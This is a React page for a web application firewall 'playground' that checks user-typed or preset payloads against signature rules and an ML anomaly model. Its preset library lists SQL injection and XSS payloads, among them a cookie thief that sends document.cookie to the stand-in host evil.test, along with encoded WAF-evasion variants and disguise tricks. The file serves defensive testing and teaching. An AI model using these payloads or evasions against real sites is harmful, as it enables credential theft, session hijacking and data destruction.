"use client"

import * as React from "react"
import {
  CheckCircle2Icon,
  FlagIcon,
  HistoryIcon,
  RotateCcwIcon,
  ShieldXIcon,
  SparklesIcon,
  TrophyIcon,
  WandSparklesIcon,
} from "lucide-react"

import { EmptyState, SeverityBadge } from "@/components/waf/shared"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Textarea } from "@/components/ui/textarea"
import { apiSend } from "@/lib/api"
import { DISGUISES } from "@/lib/disguise"
import type { PlaygroundResult, PlaygroundWhere } from "@/lib/types"

const WHERE: { id: PlaygroundWhere; label: string }[] = [
  { id: "query", label: "Search box (URL query)" },
  { id: "path", label: "Page address (URL path)" },
  { id: "form", label: "Contact form (POST body)" },
  { id: "json", label: "Shop API (JSON body)" },
  { id: "header", label: "Browser name (User-Agent header)" },
  { id: "cookie", label: "Cookie" },
]

const PRESETS: { group: string; items: { label: string; payload: string; where?: PlaygroundWhere }[] }[] = [
  {
    group: "SQL injection",
    items: [
      { label: "Login bypass", payload: "admin' OR '1'='1' --" },
      { label: "Steal passwords", payload: "1 UNION SELECT username, password FROM users --" },
      { label: "Delete a table", payload: "books'; DROP TABLE orders; --", where: "form" },
      { label: "Slow-down probe", payload: "1 AND SLEEP(5)" },
      { label: "Read DB structure", payload: "0 UNION SELECT table_name FROM information_schema.tables" },
    ],
  },
  {
    group: "Cross-site scripting",
    items: [
      { label: "Script tag", payload: "<script>alert(document.cookie)</script>" },
      { label: "Broken image", payload: "<img src=x onerror=alert(1)>" },
      { label: "SVG trick", payload: "<svg onload=alert(1)>", where: "json" },
      { label: "Script link", payload: "javascript:alert(document.domain)" },
      { label: "Cookie thief", payload: "<script>new Image().src='//evil.test/?c='+document.cookie</script>" },
    ],
  },
  {
    group: "Already disguised",
    items: [
      { label: "Double encoded", payload: "%2527%2520OR%25201%253D1%2520--" },
      { label: "Comment split", payload: "1 UN/**/ION SEL/**/ECT 1,2,3" },
      { label: "Entities", payload: "&#60;img src=x onerror=alert(1)&#62;" },
      { label: "Base64", payload: "JyBPUiAnMSc9JzE=" },
      { label: "Tab in javascript", payload: "java\tscript:alert(1)" },
    ],
  },
  {
    group: "Safe text (false-positive check)",
    items: [
      { label: "Irish name", payload: "O'Brien" },
      { label: "Shop words", payload: "Please select a size from the menu" },
      { label: "Heart", payload: "I <3 this shop, 10/10" },
      { label: "Maths", payload: "Is 1=1 always true?" },
    ],
  },
]

const VERDICT = {
  attack: { icon: ShieldXIcon, color: "var(--status-critical)", title: "Attack detected" },
  suspicious: { icon: FlagIcon, color: "var(--status-warning)", title: "Looks unusual" },
  clean: { icon: CheckCircle2Icon, color: "var(--status-good)", title: "Looks safe" },
} as const

type HistoryItem = { payload: string; where: PlaygroundWhere; verdict: PlaygroundResult["verdict"]; rule?: string }
type Score = { tried: number; caught: number }

/** Shows text with the part a rule matched highlighted. */
function Highlighted({ text, start, end }: { text: string; start?: number; end?: number }) {
  if (start === undefined || end === undefined) return <>{text || "(empty)"}</>
  return (
    <>
      {text.slice(0, start)}
      <mark className="rounded-sm bg-[color-mix(in_oklab,var(--status-critical)_25%,transparent)] px-0.5 text-foreground">
        {text.slice(start, end)}
      </mark>
      {text.slice(end)}
    </>
  )
}

function Step({ n, title, text, children }: { n: number; title: string; text?: string; children?: React.ReactNode }) {
  return (
    <li className="flex gap-3">
      <span className="flex size-6 shrink-0 items-center justify-center rounded-full border text-xs tabular-nums">{n}</span>
      <div className="flex min-w-0 flex-1 flex-col gap-1">
        <span className="text-sm font-medium">{title}</span>
        <code className="rounded-md bg-muted px-2 py-1.5 font-mono text-xs break-all whitespace-pre-wrap">
          {children ?? text}
        </code>
      </div>
    </li>
  )
}

function ScoreBar({ score, normal, threshold }: { score: number; normal: number; threshold: number }) {
  // Isolation Forest scores sit roughly between 0.3 and 0.8.
  const low = 0.3
  const high = 0.8
  const pos = (v: number) => `${Math.min(100, Math.max(0, ((v - low) / (high - low)) * 100))}%`
  const over = score >= threshold
  return (
    <div className="flex flex-col gap-2">
      <div className="relative h-3 rounded-full bg-muted">
        <div
          className="absolute inset-y-0 left-0 rounded-full"
          style={{ width: pos(score), background: over ? "var(--status-warning)" : "var(--series-allowed)" }}
        />
        <div className="absolute -inset-y-1 w-0.5 bg-foreground" style={{ left: pos(threshold) }} title="Alert line" />
        <div className="absolute -inset-y-1 w-0.5 bg-muted-foreground/60" style={{ left: pos(normal) }} title="Normal request" />
      </div>
      <div className="flex flex-wrap justify-between gap-2 text-xs text-muted-foreground tabular-nums">
        <span>This request: <b className="text-foreground">{score.toFixed(3)}</b></span>
        <span>Normal request: {normal.toFixed(3)}</span>
        <span>Alert line: {threshold.toFixed(3)}</span>
      </div>
    </div>
  )
}

export default function PlaygroundPage() {
  const [payload, setPayload] = React.useState("admin' OR '1'='1' --")
  const [where, setWhere] = React.useState<PlaygroundWhere>("query")
  const [result, setResult] = React.useState<PlaygroundResult | null>(null)
  const [error, setError] = React.useState<string | null>(null)
  const [checking, setChecking] = React.useState(false)
  const [history, setHistory] = React.useState<HistoryItem[]>([])
  const [score, setScore] = React.useState<Score>({ tried: 0, caught: 0 })
  const [lastDisguise, setLastDisguise] = React.useState<string | null>(null)
  const [bypassed, setBypassed] = React.useState(false)
  const latest = React.useRef(0)

  // Checks automatically shortly after typing stops. Older answers are ignored.
  React.useEffect(() => {
    const id = ++latest.current
    const timer = setTimeout(async () => {
      if (!payload) {
        setResult(null)
        return
      }
      setChecking(true)
      try {
        const answer = await apiSend<PlaygroundResult>("POST", "/playground/inspect", { payload, where })
        if (id !== latest.current) return
        setResult(answer)
        setError(null)
        setHistory((items) => {
          const entry = { payload, where, verdict: answer.verdict, rule: answer.findings[0]?.rule_id }
          const rest = items.filter((item) => item.payload !== payload || item.where !== where)
          return [entry, ...rest].slice(0, 12)
        })
        setBypassed(Boolean(lastDisguise) && answer.verdict === "clean")
        if (lastDisguise) {
          setScore((s) => ({ tried: s.tried + 1, caught: s.caught + (answer.verdict === "clean" ? 0 : 1) }))
          setLastDisguise(null)
        }
      } catch (cause) {
        if (id === latest.current) setError(cause instanceof Error ? cause.message : "Check failed")
      } finally {
        if (id === latest.current) setChecking(false)
      }
    }, 350)
    return () => clearTimeout(timer)
    // lastDisguise is read only to credit the score for the check it triggered.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [payload, where])

  function disguise(id: string) {
    const trick = DISGUISES.find((d) => d.id === id)
    if (!trick || !payload) return
    setLastDisguise(trick.label)
    setPayload(trick.apply(payload))
  }

  const verdict = result ? VERDICT[result.verdict] : null
  const decoding = result?.decoding
  const firstMatch = (variant: "text" | "base64", form: "normal" | "compact") =>
    decoding?.matches.find((m) => m.variant === variant && m.form === form)
  const normalMatch = firstMatch("text", "normal")
  const compactMatch = firstMatch("text", "compact")

  return (
    <>
      <Alert>
        <SparklesIcon />
        <AlertTitle>A safe place to try attacks</AlertTitle>
        <AlertDescription>
          Type or pick a payload and the real WAF engine checks it instantly. Nothing is sent to any website and nothing is logged, so you can experiment freely. Try to disguise an attack and see if you can sneak it past.
        </AlertDescription>
      </Alert>

      <div className="grid gap-4 @5xl/main:grid-cols-[minmax(0,1fr)_22rem]">
        <Card>
          <CardHeader>
            <CardTitle>Payload</CardTitle>
            <CardDescription>Checked automatically as you type</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col gap-4">
            <Textarea
              aria-label="Payload"
              value={payload}
              onChange={(event) => setPayload(event.target.value.slice(0, 8000))}
              className="min-h-28 font-mono text-sm"
              spellCheck={false}
              placeholder="Type anything, for example ' OR 1=1 --"
            />
            <div className="flex flex-wrap items-end gap-3">
              <div className="flex min-w-56 flex-col gap-1.5">
                <Label htmlFor="where">Where the attacker puts it</Label>
                <Select value={where} onValueChange={(value) => setWhere(value as PlaygroundWhere)}>
                  <SelectTrigger id="where" className="w-full">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {WHERE.map((item) => (
                      <SelectItem key={item.id} value={item.id}>{item.label}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <Button variant="ghost" onClick={() => setPayload("")}>
                <RotateCcwIcon />
                Clear
              </Button>
            </div>

            <div className="flex flex-col gap-2">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="flex items-center gap-1.5 text-sm font-medium">
                  <WandSparklesIcon className="size-4" aria-hidden />
                  Disguise it
                </span>
                <span className="flex items-center gap-1.5 text-xs text-muted-foreground tabular-nums">
                  <TrophyIcon className="size-3.5" aria-hidden />
                  Disguises tried {score.tried}, WAF caught {score.caught}
                </span>
              </div>
              <div className="flex flex-wrap gap-2">
                {DISGUISES.map((trick) => (
                  <Button key={trick.id} size="sm" variant="outline" title={trick.hint} aria-label={`${trick.label}: ${trick.hint}`} onClick={() => disguise(trick.id)} disabled={!payload}>
                    {trick.label}
                  </Button>
                ))}
              </div>
              <p className="text-xs text-muted-foreground">Tricks stack, so try several in a row.</p>
            </div>
          </CardContent>
        </Card>

        <Card aria-live="polite">
          <CardHeader>
            <CardTitle>Verdict</CardTitle>
            <CardDescription>{checking ? "Checking…" : result ? `Mode: ${result.mode}` : "Waiting for a payload"}</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col gap-4">
            {error ? <p className="text-sm text-destructive">{error}</p> : null}
            {verdict && result ? (
              <>
                <div className="flex items-center gap-3">
                  <verdict.icon className="size-10 shrink-0" style={{ color: verdict.color }} aria-hidden />
                  <div className="flex flex-col">
                    <span className="text-lg font-semibold">{verdict.title}</span>
                    <span className="text-sm text-muted-foreground">The WAF would: {result.action}</span>
                  </div>
                </div>
                {result.findings[0] ? (
                  <div className="flex flex-col gap-1 rounded-md border p-3">
                    <span className="text-xs text-muted-foreground">Caught by</span>
                    <span className="text-sm font-medium">{result.findings[0].rule_id}: {result.findings[0].rule_name}</span>
                    <div className="flex flex-wrap gap-1.5 pt-1">
                      <SeverityBadge severity={result.findings[0].severity} />
                      <Badge variant="secondary">{result.findings[0].attack === "sqli" ? "SQL injection" : result.findings[0].attack === "xss" ? "Cross-site scripting" : result.findings[0].attack}</Badge>
                      {result.findings.length > 1 ? <Badge variant="outline">+{result.findings.length - 1} more rules</Badge> : null}
                    </div>
                  </div>
                ) : result.verdict === "suspicious" ? (
                  <p className="text-sm">No attack pattern matched, but the ML model finds this request unusual.</p>
                ) : (
                  <p className="text-sm text-muted-foreground">
                    {bypassed
                      ? "This one got past. That's a real limitation to note in the report, but check whether the disguised text would still work as an attack."
                      : "No attack patterns, and the ML model sees nothing unusual."}
                  </p>
                )}
                <div className="flex gap-4 text-xs text-muted-foreground tabular-nums">
                  <span>Signatures {result.signature_ms} ms</span>
                  {result.ml.ms !== undefined ? <span>ML {result.ml.ms} ms</span> : null}
                </div>
              </>
            ) : !error ? (
              <EmptyState title="Nothing checked yet">Pick a payload below to start.</EmptyState>
            ) : null}
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Payload library</CardTitle>
          <CardDescription>Real attack examples, plus harmless text to show the WAF doesn&apos;t block normal visitors</CardDescription>
        </CardHeader>
        <CardContent className="grid gap-4 @3xl/main:grid-cols-2 @6xl/main:grid-cols-4">
          {PRESETS.map((group) => (
            <div key={group.group} className="flex flex-col gap-2">
              <span className="text-sm font-medium">{group.group}</span>
              <div className="flex flex-wrap gap-1.5">
                {group.items.map((item) => (
                  <Button
                    key={item.label}
                    size="sm"
                    variant="secondary"
                    onClick={() => {
                      setLastDisguise(null)
                      setPayload(item.payload)
                      if (item.where) setWhere(item.where)
                    }}
                  >
                    {item.label}
                  </Button>
                ))}
              </div>
            </div>
          ))}
        </CardContent>
      </Card>

      {result && decoding ? (
        <Tabs defaultValue="decoding">
          <TabsList className="flex-wrap">
            <TabsTrigger value="decoding">How it was decoded</TabsTrigger>
            <TabsTrigger value="rules">Matching rules ({result.findings.length})</TabsTrigger>
            <TabsTrigger value="ml">ML opinion</TabsTrigger>
            <TabsTrigger value="request">Pretend request</TabsTrigger>
          </TabsList>

          <TabsContent value="decoding">
            <Card>
              <CardHeader>
                <CardTitle>What the signatures actually see</CardTitle>
                <CardDescription>The WAF undoes encoding tricks before matching. The highlighted part is what a rule matched.</CardDescription>
              </CardHeader>
              <CardContent>
                <ol className="flex flex-col gap-4">
                  <Step n={1} title="What the attacker sent" text={payload} />
                  {decoding.rounds.map((round, index) => (
                    <Step key={index} n={index + 2} title={`Decoding round ${index + 1}`} text={round} />
                  ))}
                  <Step n={decoding.rounds.length + 2} title="Cleaned: Unicode folded, invisible characters and comments removed, lower case">
                    <Highlighted text={decoding.normalized} start={normalMatch?.start} end={normalMatch?.end} />
                  </Step>
                  <Step n={decoding.rounds.length + 3} title="Squashed: every space removed, to catch split-up keywords">
                    <Highlighted text={decoding.compact} start={compactMatch?.start} end={compactMatch?.end} />
                  </Step>
                  {decoding.base64 ? (
                    <Step n={decoding.rounds.length + 4} title="Looked like base64, so it was unwrapped too">
                      <Highlighted
                        text={decoding.base64_normalized ?? decoding.base64}
                        start={firstMatch("base64", "normal")?.start}
                        end={firstMatch("base64", "normal")?.end}
                      />
                    </Step>
                  ) : null}
                </ol>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="rules">
            <Card>
              <CardContent className="px-0">
                {result.findings.length ? (
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead className="pl-4">Rule</TableHead>
                        <TableHead>Severity</TableHead>
                        <TableHead>Found in</TableHead>
                        <TableHead className="pr-4">Evidence</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {result.findings.map((finding) => (
                        <TableRow key={`${finding.rule_id}-${finding.location}`}>
                          <TableCell className="pl-4">
                            <div className="font-medium">{finding.rule_id}</div>
                            <div className="text-xs text-muted-foreground">{finding.rule_name}</div>
                          </TableCell>
                          <TableCell><SeverityBadge severity={finding.severity} /></TableCell>
                          <TableCell className="font-mono text-xs">{finding.location}</TableCell>
                          <TableCell className="max-w-80 truncate pr-4 font-mono text-xs" title={finding.evidence}>{finding.evidence}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                ) : (
                  <EmptyState title="No rule matched">The signature layer would let this through.</EmptyState>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="ml">
            <Card>
              <CardHeader>
                <CardTitle>Isolation Forest anomaly score</CardTitle>
                <CardDescription>
                  ML doesn&apos;t look for attack words. It compares the shape of the request with normal traffic. Above the alert line means unusual.
                </CardDescription>
              </CardHeader>
              <CardContent className="flex flex-col gap-6">
                {result.ml.available && result.ml.score !== undefined ? (
                  <>
                    <ScoreBar score={result.ml.score} normal={result.ml.normal_score ?? 0} threshold={result.ml.threshold ?? 0} />
                    {result.ml.changed_features?.length ? (
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>What changed compared with a normal search</TableHead>
                            <TableHead className="text-right">This request</TableHead>
                            <TableHead className="text-right">Normal</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {result.ml.changed_features.map((feature) => (
                            <TableRow key={feature.name}>
                              <TableCell className="font-mono text-xs">{feature.name}</TableCell>
                              <TableCell className="text-right tabular-nums">{feature.value}</TableCell>
                              <TableCell className="text-right tabular-nums text-muted-foreground">{feature.normal}</TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    ) : null}
                  </>
                ) : (
                  <EmptyState title="ML is off or not loaded">Turn it on in Settings, or retrain it on the ML page.</EmptyState>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="request">
            <Card>
              <CardHeader>
                <CardTitle>The request the WAF imagined</CardTitle>
                <CardDescription>Your payload placed where a real visitor could send it. It isn&apos;t sent anywhere.</CardDescription>
              </CardHeader>
              <CardContent>
                <pre className="overflow-x-auto rounded-md bg-muted p-3 font-mono text-xs whitespace-pre-wrap break-all">
                  {`${result.request.method} ${result.request.url}\n`}
                  {Object.entries(result.request.headers).map(([k, v]) => `${k}: ${v}\n`).join("")}
                  {result.request.body ? `\n${result.request.body}` : ""}
                </pre>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      ) : null}

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <HistoryIcon className="size-4" aria-hidden />
            Your tries
          </CardTitle>
          <CardDescription>Kept on this page only. Select one to load it again.</CardDescription>
        </CardHeader>
        <CardContent className="px-0">
          {history.length ? (
            <Table>
              <TableBody>
                {history.map((item, index) => {
                  const v = VERDICT[item.verdict]
                  return (
                    <TableRow
                      key={index}
                      className="cursor-pointer"
                      tabIndex={0}
                      onClick={() => { setLastDisguise(null); setWhere(item.where); setPayload(item.payload) }}
                      onKeyDown={(event) => {
                        if (event.key === "Enter") { setLastDisguise(null); setWhere(item.where); setPayload(item.payload) }
                      }}
                    >
                      <TableCell className="w-36 pl-4">
                        <span className="flex items-center gap-1.5 text-sm">
                          <v.icon className="size-4" style={{ color: v.color }} aria-hidden />
                          {v.title}
                        </span>
                      </TableCell>
                      <TableCell className="max-w-96 truncate font-mono text-xs">{item.payload}</TableCell>
                      <TableCell className="pr-4 text-right text-xs text-muted-foreground">{item.rule ?? WHERE.find((w) => w.id === item.where)?.label}</TableCell>
                    </TableRow>
                  )
                })}
              </TableBody>
            </Table>
          ) : (
            <EmptyState title="No tries yet" />
          )}
        </CardContent>
      </Card>
    </>
  )
}
